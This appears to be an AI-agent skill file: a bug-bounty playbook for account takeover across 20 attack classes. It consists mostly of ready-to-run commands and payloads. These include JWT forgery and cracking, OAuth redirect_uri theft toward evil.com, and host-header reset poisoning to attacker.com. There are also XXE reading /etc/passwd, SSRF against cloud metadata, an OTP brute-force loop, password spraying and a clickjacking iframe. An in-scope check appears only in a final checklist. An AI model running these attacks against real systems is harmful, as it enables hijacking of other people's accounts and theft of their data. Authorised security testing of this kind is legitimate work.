---
name: ato-hunter
description: Complete Account Takeover hunting skill. Covers all 20 ATO classes individually — JWT attacks, OAuth/OIDC, SAML, password reset, MFA bypass, session failures, registration hijack, identifier reuse, invite-flow hijack, auth bypass, mass assignment, response manipulation, credential spray, SSO failures, race conditions, API version bypass, leaked tokens, host header injection, IDOR→ATO chain, consent clickjacking. P1/P2 focused. Kill theoretical findings fast — prove full account control or drop it.
---

# ATO-HUNTER — Account Takeover Complete Playbook

> Proof bar: **full control of another account** — log in as them, read their data, act as them.
> A theoretical redirect that could leak in theory = downgrade, not ATO.
> Any-user ATO without interaction = Critical (9.8). With interaction = High (8.8).

---

## TYPE 1 — JWT Attacks

### 1.1 alg:none (Signature Strip)
```bash
python3 -c "
import base64, json
def b64url(d):
    if isinstance(d,str): d=d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
h = b64url(json.dumps({'alg':'none','typ':'JWT'}))
p = b64url(json.dumps({'sub':'TARGET_USER_ID','role':'admin','iat':9999999999}))
print(f'{h}.{p}.')
print(f'{h}.{p}. ')  # trailing space variant
"
curl -s https://TARGET/api/user/me -H "Authorization: Bearer <crafted>"
```

### 1.2 RS256 → HS256 Confusion (Public Key as HMAC Secret)
```bash
# Get public key from JWKS
for path in /.well-known/jwks.json /jwks.json /auth/jwks /api/auth/keys; do
  curl -s "https://TARGET$path" | python3 -m json.tool 2>/dev/null | grep -q '"keys"' && echo "[JWKS] $path"
done
# Extract PEM, then:
jwt_tool.py -X a -pk public.pem -I -pc sub -pv TARGET_USER_ID "$ORIGINAL_TOKEN"
```

### 1.3 JWK Set Injection (Embed Your Own Key)
```bash
# Generate key pair, embed public key as "jwk" in JWT header
# jwt_tool.py -X i <token>
# Server that auto-trusts embedded JWK will verify with your key → sign anything
```

### 1.4 jku / x5u Injection
```bash
# Point jku/x5u header to attacker-hosted JWKS
jwt_tool.py -X s -ju "https://attacker.com/jwks.json" "$ORIGINAL_TOKEN"
```

### 1.5 KID Injection
```bash
# SQL injection in kid
jwt_tool.py -I -hc kid -hv "' UNION SELECT 'attacker_secret'-- -" -S hs256 -p "attacker_secret" "$TOKEN"
# Path traversal in kid (empty HMAC secret)
jwt_tool.py -I -hc kid -hv "../../dev/null" -S hs256 -p "" "$TOKEN"
```

### 1.6 Weak Secret Brute Force
```bash
hashcat -a 0 -m 16500 "$JWT_TOKEN" /usr/share/wordlists/rockyou.txt
```

### 1.7 Claim Tampering
```bash
# Change sub/uid/email/role/isAdmin/exp — re-sign if secret known
jwt_tool.py -I -pc sub -pv "VICTIM_USER_ID" "$TOKEN"
jwt_tool.py -I -pc role -pv "admin" "$TOKEN"
jwt_tool.py -I -pc exp -pv 9999999999 "$TOKEN"
```

**Confirm:** hit `/api/user/me` or equivalent. Response must show victim's data.

---

## TYPE 2 — OAuth 2.0 / OIDC Attacks

### 2.1 redirect_uri Theft (the #1 payer)
```
redirect_uri=https://evil.com
redirect_uri=https://evil.com?x=target.com
redirect_uri=https://target.com.evil.com
redirect_uri=https://target.com@evil.com
redirect_uri=https://target.com/cb/../../evil
redirect_uri=https://sub.target.com/openredirect?to=evil.com
```
**Confirm:** land the `code`/`token` on your listening host. Exchange code for access token → log in as victim.

### 2.2 Code/Token Leak via Referer
- Auth code lands on page that loads 3rd-party images/scripts
- `Referer` header contains the code in the URL
- Inject outbound link on the landing page → capture

### 2.3 Missing state → CSRF / Forced Account-Linking
```bash
# Start OAuth flow — capture authorization URL
# If no state= param → CSRF → force-link victim's session to attacker's social account
# PoC: victim visits attacker page → iframe loads authorization URL → account linked
```

### 2.4 Authorization Code Reuse
```bash
CODE="captured_code"
# Exchange 1 (legitimate)
curl -s "https://TARGET/oauth/token" -X POST \
  -d "grant_type=authorization_code&code=$CODE&redirect_uri=...&client_id=X&client_secret=Y"
# Exchange 2 (should fail)
curl -s "https://TARGET/oauth/token" -X POST \
  -d "grant_type=authorization_code&code=$CODE&redirect_uri=...&client_id=X&client_secret=Y"
```

### 2.5 PKCE Downgrade
```bash
# Normal PKCE includes code_challenge — test without it
curl -s "https://TARGET/oauth/authorize?client_id=X&redirect_uri=...&response_type=code"
# No error = PKCE not enforced
```

### 2.6 Password Grant Bypass (MFA Skip)
```bash
# Check OIDC discovery for grant_types_supported: ["password"]
TOKEN_EP=$(curl -s "https://TARGET/.well-known/openid-configuration" | jq -r '.token_endpoint')
curl -s "$TOKEN_EP" -X POST \
  -d "grant_type=password&username=admin@target.com&password=admin&client_id=X"
# If returns access_token → MFA bypassed entirely
```

### 2.7 nonce / iss / aud Not Validated
```bash
jwt_tool.py -I -pc iss -pv "https://accounts.attacker.com" "$ID_TOKEN"
jwt_tool.py -I -pc aud -pv "another_client_id" "$ID_TOKEN"
# Replay old id_token with expired nonce
```

### 2.8 Consent Clickjacking
```bash
# Check if /oauth/authorize is frameable
curl -sI "https://TARGET/oauth/authorize?..." | grep -i x-frame-options
# Missing → iframeable → victim silently grants attacker's app access
```

### 2.9 Client Secret in JS Bundle
```bash
grep -rh 'client_secret\|clientSecret\|CLIENT_SECRET' js_files/ beautified/ | grep -v '^\s*//'
# Confirm: mint token directly → access_token returned → P1
```

### 2.10 OIDC request_uri SSRF
```bash
curl -sv "https://TARGET/oauth/authorize?client_id=X&request_uri=http://169.254.169.254/latest/meta-data/"
```

---

## TYPE 3 — SAML Attacks

### 3.1 XML Signature Wrapping (XSW)
```
# SAML Raider (Burp extension) → XSW #1–#8 automated
# Manual XSW #2 (most common):
# Inject forged Assertion ID="a2" before the legitimate signed Assertion ID="a1"
# SP reads first (forged), validates signature on second (legitimate) — bypass
```

### 3.2 Signature Stripping
```bash
# Remove the ds:Signature block entirely and submit
# If login succeeds → P1 (become any user by setting NameID)
```

### 3.3 NameID Injection
```
admin@target.com<!---->        # comment injection → some parsers yield admin@target.com
admin@target.com%00            # null byte truncation
ADMIN@target.com               # case normalization
```

### 3.4 XXE in SAML
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:NameID>&xxe;</saml:NameID>
```

### 3.5 Key Confusion / Self-Signed Cert Accepted
```bash
# Generate self-signed cert, sign assertion with it
# If SP accepts → forge any identity
```

---

## TYPE 4 — Password Reset Attacks

### 4.1 Host Header Injection → Reset Link Poisoning
```bash
curl -s "https://TARGET/api/auth/reset-password" -X POST \
  -H "Host: TARGET" -H "X-Forwarded-Host: attacker.com" \
  -d '{"email":"victim@target.com"}'
# Also: Host: TARGET:@attacker.com
# Also: X-Host: attacker.com
# Confirm: reset email arrives with attacker.com domain in link
```

### 4.2 Predictable / Weak Reset Token
```bash
# Request 10 tokens for same account, analyze:
python3 -c "
import base64, math, collections
tokens = open('tokens.txt').read().splitlines()
for tok in tokens:
    try:
        decoded = base64.b64decode(tok + '==')
        c = collections.Counter(decoded)
        entropy = -sum((v/len(decoded))*math.log2(v/len(decoded)) for v in c.values())
        print(f'entropy={entropy:.2f}: {tok[:30]}...')
    except: print(f'not_b64: {tok[:30]}...')
"
# < 3.0 bits/byte = weak PRNG = predictable
```

### 4.3 Token Reuse After Use
```bash
TOKEN="used_reset_token"
curl -s "https://TARGET/api/auth/reset-password/confirm" -X POST \
  -d "{\"token\":\"$TOKEN\",\"password\":\"NewPass123!\"}"
curl -s "https://TARGET/api/auth/reset-password/confirm" -X POST \
  -d "{\"token\":\"$TOKEN\",\"password\":\"AnotherPass456!\"}"
# If second succeeds → token reuse
```

### 4.4 Token Leak via Referer
```bash
# Reset link: https://target.com/reset?token=ABC123
# If reset page loads third-party resource (analytics, fonts, images)
# → HTTP Referer header leaks the full URL including token
```

### 4.5 Email Parameter Injection
```bash
# Double email parameter
curl -s "https://TARGET/api/auth/reset-password" -X POST \
  -d "email=victim@target.com&email=attacker@target.com"
# CC via CRLF
curl -s "https://TARGET/api/auth/reset-password" -X POST \
  -d "email=victim@target.com%0aCc:attacker@target.com"
```

### 4.6 Token in Response Body
```bash
curl -s "https://TARGET/api/auth/reset-password" -X POST \
  -d '{"email":"victim@target.com"}' | jq .
# If response body contains the reset token → P1
```

---

## TYPE 5 — MFA / 2FA Bypass

### 5.1 Step Skip (Direct Endpoint)
```bash
PARTIAL=$(curl -s "https://TARGET/api/auth/login" -X POST \
  -d '{"email":"victim@target.com","password":"pass"}' | jq -r '.token')
# Skip OTP step — hit authenticated endpoints directly
curl -s "https://TARGET/api/user/me" -H "Authorization: Bearer $PARTIAL"
# Data returned = 2FA entirely bypassed
```

### 5.2 OTP Brute Force (No Rate Limit)
```bash
for otp in $(seq -w 000000 001000); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET/api/auth/verify-otp" -X POST \
    -H "Authorization: Bearer $PARTIAL" -d "{\"otp\":\"$otp\"}")
  [ "$code" = "200" ] && echo "[HIT] OTP=$otp" && break
  sleep 0.1
done
# GraphQL alias batching: send 100 OTP guesses in one query
```

### 5.3 OTP Reuse
```bash
OTP="123456"
# Use once → use again with same partial-auth token
curl -s "https://TARGET/api/auth/verify-otp" -X POST -d "{\"otp\":\"$OTP\"}" -H "Authorization: Bearer $PARTIAL"
curl -s "https://TARGET/api/auth/verify-otp" -X POST -d "{\"otp\":\"$OTP\"}" -H "Authorization: Bearer $PARTIAL"
```

### 5.4 OTP Race Condition
```bash
# Two concurrent requests before server marks OTP used
OTP="123456"
for i in 1 2; do
  curl -s "https://TARGET/api/auth/verify-otp" -X POST \
    -H "Authorization: Bearer $PARTIAL" -d "{\"otp\":\"$OTP\"}" &
done; wait
# Use Turbo Intruder for proper race (20+ concurrent)
```

### 5.5 2FA Disable Without Re-auth
```bash
curl -s "https://TARGET/api/account/2fa/disable" -X POST \
  -H "Authorization: Bearer $AUTH_TOKEN" \
  -d '{"reason":"lost_device"}'
# Disabled without OTP/password prompt = P2
```

### 5.6 Response Manipulation
```bash
# Intercept verify-otp response (Burp)
# Change: {"success":false} → {"success":true}
# Change: {"2fa_required":true} → {"2fa_required":false}
```

---

## TYPE 6 — Session Management Failures

### 6.1 Session Not Invalidated on Logout
```bash
TOKEN=$(curl -s "https://TARGET/api/auth/login" -X POST -d '{"email":"x","password":"y"}' | jq -r '.token')
curl -s "https://TARGET/api/auth/logout" -H "Authorization: Bearer $TOKEN"
curl -s "https://TARGET/api/user/me" -H "Authorization: Bearer $TOKEN"
# Data returned = session survives logout
```

### 6.2 Session Not Invalidated on Password Change
```bash
# Capture token → change password → old token must be revoked
# Test old token against /api/user/me
```

### 6.3 Session Fixation
```bash
FIXED_SID=$(curl -s -c - "https://TARGET/login" | grep 'PHPSESSID\|session' | awk '{print $NF}')
curl -s "https://TARGET/login" -X POST \
  -H "Cookie: PHPSESSID=$FIXED_SID" -d "username=victim&password=pass"
# Attacker who knows $FIXED_SID before victim logs in → hijacks session
```

### 6.4 Predictable Session Token
```bash
for i in $(seq 10); do
  curl -s "https://TARGET/api/auth/login" -X POST -d '{"email":"x","password":"y"}' | jq -r '.token'
done > tokens.txt
# Low entropy (<3.0 bits/byte) = brute-forceable
```

### 6.5 Missing Cookie Security Flags
```bash
curl -sI "https://TARGET/login" | grep -i 'set-cookie'
# Missing: Secure, HttpOnly, SameSite=Strict/Lax → XSS/HTTP/CSRF → session theft
# Broad Domain=.parent.com → XSS on any subdomain steals session
```

---

## TYPE 7 — Registration / Account Pre-Hijacking

### 7.1 Account Pre-Hijack
```bash
# Register victim's email BEFORE they do
curl -s "https://TARGET/api/auth/register" -X POST \
  -d '{"email":"victim@company.com","password":"AttackerPass123!"}'
# Victim can't register → uses "forgot password" → attacker's account gets reset
# OR: victim verifies → attacker's account gets verified → both have access
```

### 7.2 SSO Pre-Hijack / Email Merge
```bash
# Register with victim's email unverified
# Victim later "Sign in with Google" (victim@company.com)
# Server merges by email match without re-verification → attacker session = victim account
```

### 7.3 Email-Verification Bypass on OAuth Grant
```bash
# IdP trusts unverified email claim → claim admin@target.com without owning it
# Test: register with unverified email → immediately attempt OAuth → does server grant access?
```

### 7.4 Unicode Normalization Attack
```bash
python3 -c "
import unicodedata
for t in ['ẚdmin','аdmin','admın','admin ']:
    nfc = unicodedata.normalize('NFC', t)
    nfkc = unicodedata.normalize('NFKC', t)
    print(f'{t!r} NFC={nfc!r} NFKC={nfkc!r}')
"
# Register unicode variant of admin/reserved account
# If login normalizes back to ascii admin → ATO
```

### 7.5 Email Alias / Case Clash
```bash
curl -s "https://TARGET/api/auth/register" -X POST -d '{"email":"admin+test@target.com","password":"Test123!"}'
curl -s "https://TARGET/api/auth/register" -X POST -d '{"email":"ADMIN@target.com","password":"Test123!"}'
# Does a separate account get created or does it clash with existing admin?
```

---

## TYPE 8 — Identifier Reuse

```bash
# 1. Create account A with username/email/handle "target_handle"
# 2. Rename/delete account A (free the identifier)
# 3. Create account B claiming "target_handle"
# 4. Account B inherits A's orphaned resources, org memberships, invite links
# Root cause: ownership keyed on mutable identifier
# Common surfaces: username change, account deletion, email change workflows
```

---

## TYPE 9 — Invite-Flow / Unverified-Signup Hijack

```bash
# Variant A: Org invite hijack
# 1. Invite victim@company.com to your org (no account required)
# 2. Do NOT click the invite link
# 3. Register directly as victim@company.com (no email verification enforced)
# 4. Log in → pending invite attaches to your session → accept → admin in victim's org

# Variant B: Guest checkout PII inheritance
# 1. Place order under victim@company.com (guest checkout, no account)
# 2. Register as victim@company.com (no email verification)
# 3. Log in → victim's order history/PII/address on your account
```

---

## TYPE 10 — Authentication Bypass (HTTP Tricks)

### 10.1 Header-Based Bypass
```bash
PROTECTED="https://TARGET/admin"
curl -s "$PROTECTED" -H "X-Forwarded-For: 127.0.0.1"
curl -s "$PROTECTED" -H "X-Real-IP: 127.0.0.1"
curl -s "$PROTECTED" -H "X-Original-URL: /admin"
curl -s "$PROTECTED" -H "X-Rewrite-URL: /admin"
curl -s "$PROTECTED" -H "X-Custom-IP-Authorization: 127.0.0.1"
```

### 10.2 URL Normalization
```bash
for trick in "//admin" "/admin/" "/admin%2F" "/admin%20" "/admin;.js" "/admin.." \
             "/ADMIN" "/Admin" "/%61dmin" "/./admin" "/admin.json" "/admin.html"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET$trick")
  echo "$code $trick"
done | grep -v "^30[0-9]\|^40[14]"
```

### 10.3 Cookie Strip Bypass
```bash
# Remove Cookie header entirely (not swap) on state-changing endpoints
# Confirmed pattern: DELETE /{id} blocked with Cookie:, succeeds with Cookie stripped
curl -s "https://TARGET/api/resource/123" -X DELETE   # no auth headers at all
```

---

## TYPE 11 — Mass Assignment

```bash
# Registration mass assignment
curl -s "https://TARGET/api/register" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@test.com","password":"Test123!",
       "role":"admin","is_admin":true,"admin":true,"verified":true,
       "plan":"enterprise","subscription":"premium","emailVerified":true}'

# Profile update mass assignment
curl -s "https://TARGET/api/user/profile" -X PUT \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","email":"test@test.com","role":"admin","is_staff":true}'
```

---

## TYPE 12 — Response Manipulation

```bash
# Intercept any auth response (Burp/mitmproxy) and modify:
# {"authenticated": false}  →  {"authenticated": true}
# {"role": "user"}          →  {"role": "admin"}
# {"2fa_required": true}    →  {"2fa_required": false}
# HTTP 401                  →  200
# Works when auth logic is client-side or proxy routes on response body
```

---

## TYPE 13 — Credential Attack / Password Spray

```bash
# Full pipeline:
# 1. /wordlist-gen — cewler + hashcat rules (balanced mode)
# 2. /breach-check — HIBP k-anon, rank by breach count (sweet spot: 1-1000k hits)
# 3. /osint-employees — theHarvester + username-anarchy permutations
# 4. /spray — spray order (pass × all_users), 30 min/round, 1 pass/user/round

# Spray alone rarely pays — chain it:
# Spray finds creds → authenticated hunt → IDOR/BL bug → "ATO via spray + IDOR" = P1
# Mode selection:
#   http-form → custom login page
#   oauth     → grant_type=password
#   o365      → trevorspray
#   okta      → trevorspray
```

---

## TYPE 14 — SSO / Federation Failures

```bash
# Password grant bypass: SSO "enforced" only in UI
curl -s "https://TARGET/api/auth/login" -X POST \
  -d '{"email":"admin@target.com","password":"admin"}' | jq .
# If access_token returned → SSO enforcement is UI-only

# Password grant via OIDC discovery
TOKEN_EP=$(curl -s "https://TARGET/.well-known/openid-configuration" | jq -r '.token_endpoint')
curl -s "$TOKEN_EP" -X POST \
  -d "grant_type=password&username=admin@target.com&password=admin&client_id=X"

# Tenant isolation: capture SSO token for tenant A → replay against tenant B subdomain
# → cross-tenant account access
```

---

## TYPE 15 — Race Conditions on Auth

```bash
# OTP race: 20 concurrent requests before server marks OTP used
# Use Turbo Intruder (Burp) → "race single-packet attack"

# Password change race: TOCTOU
# Thread 1: change email to new@attacker.com
# Thread 2: request password reset for original email
# Race window: both execute before server updates email → reset link goes to original + new

# Timing oracle for user enumeration:
time curl -s "https://TARGET/api/auth/login" -X POST -d '{"email":"a@a.com","password":"a"}'
time curl -s "https://TARGET/api/auth/login" -X POST -d '{"email":"admin@target.com","password":"a"}'
# Different timing = user exists confirmation = enumeration
```

---

## TYPE 16 — API Version Bypass

```bash
# Older API versions often lack auth middleware added in newer versions
for ver in v0 v1 v2 v3 beta alpha legacy api2; do
  for path in /admin /users /config /debug /internal /me; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET/api/$ver$path")
    echo "$code /api/$ver$path"
  done
done | grep "^200\|^201\|^204"

# Also test without /api/ prefix:
curl -s "https://TARGET/v1/admin/users"
curl -s "https://TARGET/v2/admin/users"
```

---

## TYPE 17 — Leaked Token / Client Secret in JS

```bash
# Hunt in JS bundles
grep -rh 'client_secret\|clientSecret\|CLIENT_SECRET\|oauth_secret\|access_token\|refresh_token' \
  js_files/ beautified/ deobfuscated/ | grep -v '^\s*//' | head -30

# Confirm client_secret (mint live token)
curl -sX POST "https://TARGET/oauth/token" \
  -H "Authorization: Basic $(echo -n 'CLIENT_ID:CLIENT_SECRET' | base64)" \
  -d "grant_type=client_credentials"
# access_token returned = live P1

# Also hunt: SSR state leaks
curl -sL "https://TARGET/" | python3 -c "
import sys, re, json
html = sys.stdin.read()
for pat in [r'window\.__NEXT_DATA__\s*=\s*({.+?});\s*</script>',
            r'window\.__NUXT__\s*=\s*(.+?);\s*</script>']:
    m = re.search(pat, html, re.DOTALL)
    if m:
        data = json.loads(m.group(1))
        print(json.dumps(data, indent=2)[:2000])
"
```

---

## TYPE 18 — Host Header Injection → Reset Link Poisoning

```bash
# Covered in TYPE 4.1 above — standalone type classification:
# Root cause: app constructs reset URL using HTTP Host header without validation
# Variants:
curl -s "https://TARGET/forgot-password" -X POST \
  -H "Host: TARGET" \
  -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@target.com"

curl -s "https://TARGET/forgot-password" -X POST \
  -H "Host: TARGET:@attacker.com" \
  -d "email=victim@target.com"

curl -s "https://TARGET/forgot-password" -X POST \
  -H "Host: TARGET" \
  -H "X-Host: attacker.com" \
  -d "email=victim@target.com"
# Confirm: receive email, check link domain = attacker.com → P1
```

---

## TYPE 19 — IDOR → ATO Chain

```bash
# The highest-value ATO chain. IDOR read surfaces ATO primitives:

# Chain A: IDOR read → harvest victim email → password reset → ATO
# 1. IDOR read on /api/users/{id} → get victim email
# 2. Trigger password reset for that email
# 3. If reset link also vulnerable to host header injection → full ATO

# Chain B: IDOR read → harvest API key → admin endpoint
# 1. IDOR read → victim's API key in response
# 2. Use API key to call admin-only endpoint

# Chain C: JWT sub/uid IDOR → forge token → ATO (P1 always)
# JWT sub/uid is used as the database lookup key AND is mutable
# Modify sub claim → server queries different user's data
jwt_tool.py -I -pc sub -pv "VICTIM_USER_ID" "$TOKEN"

# Chain D: IDOR read → webhook secret → forge inbound webhook → account state change
# 1. IDOR on /api/integrations/{id} → webhook signing secret
# 2. Forge signed webhook payload → trigger account state changes
```

---

## TYPE 20 — Consent Clickjacking (OAuth Authorize Page)

```bash
# Check if the authorize page is frameable
curl -sI "https://TARGET/oauth/authorize?client_id=X&redirect_uri=Y&response_type=code" \
  | grep -i 'x-frame-options\|content-security-policy'

# Missing X-Frame-Options / frame-ancestors → iframeable
# PoC: attacker page iframes the authorize page → victim silently clicks "Allow"
# → attacker's OAuth app gets access to victim's account data → ATO
# Coinbase paid $5k for this

# PoC iframe:
# <iframe src="https://TARGET/oauth/authorize?client_id=ATTACKER_APP&..." style="opacity:0.1"></iframe>
# Overlay a decoy button over the real "Allow" button → victim clicks decoy → clicks Allow
```

---

## Proof-of-Impact Bar

| Scenario | Severity | CVSS |
|---|---|---|
| Any-user ATO, no victim interaction | Critical | 9.8 |
| Any-user ATO, with victim interaction | High | 8.8 |
| JWT claim tamper → full account control | Critical | 9.1 |
| OAuth redirect_uri → code theft → login as victim | Critical | 9.8 |
| Password reset host header poisoning | High | 8.1 |
| MFA step skip | P1/Critical | 9.8 |
| Session not invalidated on logout (alone) | Low/Info | Do not submit alone |

**Never submit:** theoretical redirect with no code/token captured, session-not-invalidated-on-logout alone, rate limit on non-OTP surface alone.

---

## Quick Kill Checklist (run before writing report)

```
[ ] Full account control demonstrated (log in as victim, read their data)?
[ ] PoC is a curl command a triager runs in 60 seconds?
[ ] No victim unusual action required?
[ ] In-scope asset confirmed?
[ ] Not a known/disclosed finding on this program?
[ ] CVSS computed by hand (not self-reported)?
[ ] Zero "could potentially" language in report?
```
